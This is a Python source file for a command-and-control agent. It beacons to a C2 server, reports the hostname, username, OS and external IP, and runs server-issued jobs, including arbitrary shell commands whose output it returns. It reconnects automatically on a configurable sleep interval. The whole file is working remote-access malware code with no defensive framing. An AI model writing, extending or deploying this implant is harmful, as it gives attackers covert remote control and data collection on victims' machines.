#!/usr/bin/env python3
import socket
import json
import platform
import getpass
import uuid
import time
import subprocess
import os

class BaseAgent:
    def __init__(self, server_host='127.0.0.1', server_port=4444, agent_id=None):
        self.server_host = server_host
        self.server_port = server_port
        self.agent_id = agent_id or str(uuid.uuid4())
        self.sleep_interval = 60  # seconds
        self.running = True
        
    def get_system_info(self):
        """Collect system information"""
        return {
            'hostname': platform.node(),
            'username': getpass.getuser(),
            'architecture': platform.architecture()[0],
            'os_version': platform.platform(),
            'process_name': os.path.basename(__file__),
            'external_ip': self.get_external_ip()
        }
    
    def get_external_ip(self):
        """Get external IP address"""
        try:
            # This is a simple method - in production, use multiple services
            import requests
            response = requests.get('https://httpbin.org/ip', timeout=5)
            return response.json().get('origin', 'Unknown')
        except:
            return 'Unknown'
    
    def connect(self):
        """Main agent loop"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.server_host, self.server_port))
                print(f"[+] Connected to C2 server at {self.server_host}:{self.server_port}")
                
                # Initial check-in
                self.checkin(sock)
                
                # Main communication loop
                while self.running:
                    try:
                        # Receive data from server
                        data = sock.recv(4096).decode('utf-8')
                        if not data:
                            break
                            
                        message = json.loads(data)
                        self.handle_message(message, sock)
                        
                    except socket.timeout:
                        continue
                    except Exception as e:
                        print(f"[-] Error receiving data: {e}")
                        break
                        
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                print(f"[*] Reconnecting in {self.sleep_interval} seconds...")
                time.sleep(self.sleep_interval)
    
    def checkin(self, sock):
        """Send check-in message to server"""
        message = {
            'type': 'checkin',
            'agent_id': self.agent_id,
            'system_info': self.get_system_info()
        }
        sock.send(json.dumps(message).encode('utf-8'))
        print("[+] Check-in sent to server")
    
    def handle_message(self, message, sock):
        """Handle incoming message from server"""
        message_type = message.get('type')
        
        if message_type == 'job':
            self.handle_job(message, sock)
        else:
            print(f"[!] Unknown message type: {message_type}")
    
    def handle_job(self, message, sock):
        """Handle job execution"""
        job_id = message['job_id']
        module_name = message['module_name']
        arguments = message.get('arguments', {})
        
        print(f"[+] Received job {job_id}: {module_name}")
        
        try:
            # Execute the job based on module name
            if module_name == 'shell':
                result = self.execute_shell_command(arguments)
            elif module_name == 'sysinfo':
                result = self.get_detailed_system_info()
            elif module_name == 'sleep':
                result = self.update_sleep_interval(arguments)
            else:
                result = f"Unknown module: {module_name}"
            
            # Send result back to server
            response = {
                'type': 'job_result',
                'agent_id': self.agent_id,
                'job_id': job_id,
                'output': result,
                'success': True
            }
            
        except Exception as e:
            response = {
                'type': 'job_result',
                'agent_id': self.agent_id,
                'job_id': job_id,
                'output': f"Error: {str(e)}",
                'success': False
            }
        
        sock.send(json.dumps(response).encode('utf-8'))
        print(f"[+] Job {job_id} completed")
    
    def execute_shell_command(self, arguments):
        """Execute shell command"""
        command = arguments.get('command', '')
        if not command:
            return "No command provided"
        
        try:
            result = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT,
                timeout=30
            )
            return result.decode('utf-8', errors='ignore')
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def get_detailed_system_info(self):
        """Get detailed system information"""
        info = self.get_system_info()
        info['current_directory'] = os.getcwd()
        info['python_version'] = platform.python_version()
        return json.dumps(info, indent=2)
    
    def update_sleep_interval(self, arguments):
        """Update agent sleep interval"""
        new_interval = arguments.get('interval')
        if new_interval and isinstance(new_interval, int):
            self.sleep_interval = new_interval
            return f"Sleep interval updated to {new_interval} seconds"
        else:
            return "Invalid interval provided"

if __name__ == "__main__":
    # Example usage
    agent = BaseAgent(server_host='127.0.0.1', server_port=4444)
    agent.connect()